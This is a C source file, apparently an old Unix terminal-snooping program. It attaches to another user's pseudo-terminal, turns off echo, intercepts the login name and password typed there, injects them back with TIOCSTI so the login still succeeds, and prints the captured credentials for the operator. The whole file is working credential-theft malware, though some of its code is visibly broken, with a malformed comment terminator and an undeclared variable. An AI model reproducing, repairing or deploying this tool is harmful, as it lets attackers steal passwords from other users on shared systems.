#include <stdio.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/termios.h>

#define DEBUG 1         /* Enable additional debugging info (needed!) */
#define USLEEP          /* Define this if your UNIX supports usleep() */

#ifdef ULTRIX
#define TCGETS TCGETP   /* Get termios structure */
#define TCSETS TCSANOW  /* Set termios structure */
#endif


handler(signal)
           int signal;             /* signalnumber */
{                       /* do nothing, ignore the signal */
        if(DEBUG) printf("Ignoring signal %d\n",signal);
}

int readandpush(f,string)
FILE *f;
char *string;
{
        char *cp,*result;
        int e;
        struct termios termios;

        result=fgets(string,20,f);    /* Read a line into string */
        if (result==NULL)
        {       perror("fgets()");
                return(1);
        }
        if (DEBUG)
        {       printf("String: %s\n",string);
                fflush(stdout);
        }

        ioctl(0,TCGETS,&termios);       /* These 3 lines turn off input echo */
 /*        echo = (termios.c_lflag & ECHO);      */
        termios.c_lflag=((termios.c_lflag | ECHO) - ECHO);
        ioctl(0,TCSETS,&termios);

        for (cp=string;*cp;cp++)        /* Push it back as input */
        {       e=ioctl(0,TIOCSTI,cp);
                if(e<0)
                {       perror("ioctl()");
                        return(1);
                }
        }
        return(0);
}

main(argc,argv)
int argc;
char *argv[];
{
        /* variables */
        int err;
        FILE *f;
        char *term      = "12345678901234567890";
        char *login     = "12345678901234567890";
        char *password  = "12345678901234567890";
        if (argc < 2)
        {       printf("Usage: %s /dev/ttyp?\nDon't forget to redirect the output to a file !\n",argv[0]);
                printf("Enter ttyname: ");
                gets(term);
        }
        else term=argv[argc-1];

        signal(SIGQUIT,handler);
        signal(SIGINT,handler);
        signal(SIGTERM,handler);
        signal(SIGHUP,handler);
        signal(SIGTTOU,handler);

        close(0);               /* close stdin */
#ifdef ULTRIX
        if(setpgrp(0,100)==-1)
                perror("setpgrp:");     /* Hopefully this works */
#else
        if(setsid()==-1)
                perror("setsid:"); /* Disconnect from our controlling TTY and
                                   start a new session as sessionleader */
#endif
        f=fopen(term,"r");      /* Open tty as a stream, this guarantees
                                           getting file descriptor 0 */
        if (f==NULL)
        {       printf("Error opening %s with fopen()\n",term);
                exit(2);
        }
        if (DEBUG) system("ps -xu>>/dev/null &");
        fclose(f);              /* Close the TTY again */
        f=fopen("/dev/tty","r");        /* We can now use /dev/tty instead */
        if (f==NULL)
        {       printf("Error opening /dev/tty with fopen()\n",term);
                exit(2);
        }

        if(readandpush(f,login)==0)
        {
#ifdef USLEEP
                usleep(20000);  /* This gives login(1) a chance to read the
                                   string, or the second call would read the
                                   input that the first call pushed back ! /*
#else
                for(i=0;i<1000;i++)
                        err=err+(i*i)
                           /* error        /* Alternatives not yet implemented */
#endif
                readandpush(f,password);
                printf("Result: First: %s Second: %s\n",login,password);
        }

        fflush(stdout);
        sleep(30);      /* Waste some time, to prevent that we send a SIGHUP
                           to login(1), which would kill the user. Instead,
                           wait a while. We then send SIGHUP to the shell of
                           the user, which will ignore it. */
        fclose(f);
}

